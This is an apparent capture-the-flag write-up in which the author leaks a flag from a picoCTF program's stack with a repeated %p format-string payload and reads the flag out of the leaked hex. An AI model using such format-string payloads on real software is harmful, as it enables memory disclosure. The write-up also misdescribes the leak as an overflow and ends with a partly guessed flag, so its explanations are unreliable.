# What I did
Program takes user input in the form of story and we can add format specifiers there to access the flag. User input can be 127 characters but we can access more space using format specifiers thus causing an ovefflow of the stack.
On inputting format specifier %p, I got the following output:
```
Tell me a story and then I'll tell you one >> 
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's a story - 
0xff9aa4c00xff9aa4e00x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x804c0000xebf7986e0x804838d0xebf959900xff9aa5440xebf95b500xebf614100x10x1(nil)0xebf614100x10xebf95000
```
On finding the difference between two of these, we get the offset which is 32
Then on entering several different format specifier attacks, I got a hex value which on converting to text, I got a jumbled up version of the flag:
ocip{FTCk43L_gn1g4lFff0_4tS_9_kc06f5}
ocip{FTCk43L_gn1g4lFff0_4tS_C06f5}
It seems as if it has reverse the flag as ocip reversed is pico and k43L reversed gives L34k and FTC reved is CTF, n1g4lFff0, this seems like Gl4g 0ff and 1n.
I this managed to figure out the first part.
picoCTF{L34k1ng_Fl4g_0ff_St4ck_ and the second part is a jumbled version of C06f5716}.
